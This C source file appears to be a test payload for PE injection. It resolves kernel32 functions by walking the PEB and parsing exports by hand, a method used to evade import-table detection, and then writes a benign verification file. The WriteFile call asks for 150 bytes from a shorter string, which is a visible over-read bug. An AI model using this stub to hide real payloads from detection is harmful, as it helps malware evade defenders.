/*
 * PE Injection - Manual Import Resolution Payload
 *
 * 手动解析导入的载荷
 * 不依赖IAT，直接从PEB获取kernel32并解析API
 */

#include <windows.h>

// PEB 结构定义
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// 类型定义
typedef HANDLE (WINAPI *pCreateFileA)(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);

typedef BOOL (WINAPI *pWriteFile)(
    HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);

// 简单的字符串比较
int my_strcmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}

// 获取kernel32基址
HMODULE GetKernel32Base() {
    PPEB peb;
    PPEB_LDR_DATA ldr;
    PLIST_ENTRY list;
    PLDR_DATA_TABLE_ENTRY entry;

    // 从TEB获取PEB
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif

    ldr = peb->Ldr;
    list = &ldr->InMemoryOrderModuleList;

    // 第一个是exe，第二个是ntdll，第三个是kernel32
    entry = CONTAINING_RECORD(list->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    entry = CONTAINING_RECORD(entry->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    entry = CONTAINING_RECORD(entry->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    return (HMODULE)entry->DllBase;
}

// 获取导出函数地址
FARPROC GetProcAddressManual(HMODULE hModule, const char* procName) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExport->AddressOfFunctions);
    DWORD* pNames = (DWORD*)((BYTE*)hModule + pExport->AddressOfNames);
    WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hModule + pNames[i]);
        if (my_strcmp(name, procName) == 0) {
            return (FARPROC)((BYTE*)hModule + pFunctions[pOrdinals[i]]);
        }
    }

    return NULL;
}

int main(void) {
    // 手动获取kernel32
    HMODULE hKernel32 = GetKernel32Base();
    if (!hKernel32) return 1;

    // 手动解析API
    pCreateFileA _CreateFileA = (pCreateFileA)GetProcAddressManual(hKernel32, "CreateFileA");
    pWriteFile _WriteFile = (pWriteFile)GetProcAddressManual(hKernel32, "WriteFile");
    pCloseHandle _CloseHandle = (pCloseHandle)GetProcAddressManual(hKernel32, "CloseHandle");

    if (!_CreateFileA || !_WriteFile || !_CloseHandle) return 2;

    // 创建验证文件
    HANDLE hFile = _CreateFileA(
        "C:\\Users\\Public\\pe_injection_manual_verified.txt",
        0x40000000, // GENERIC_WRITE
        0,
        NULL,
        2, // CREATE_ALWAYS
        0x80, // FILE_ATTRIBUTE_NORMAL
        NULL
    );

    if (hFile != (HANDLE)-1) {
        const char* msg = "PE Injection Verified!\r\n"
                         "Technique: PE Injection with Manual Import Resolution\r\n"
                         "Status: Successfully executed without IAT!\r\n";

        DWORD written;
        _WriteFile(hFile, msg, 150, &written, NULL);
        _CloseHandle(hFile);
    }

    return 0;
}
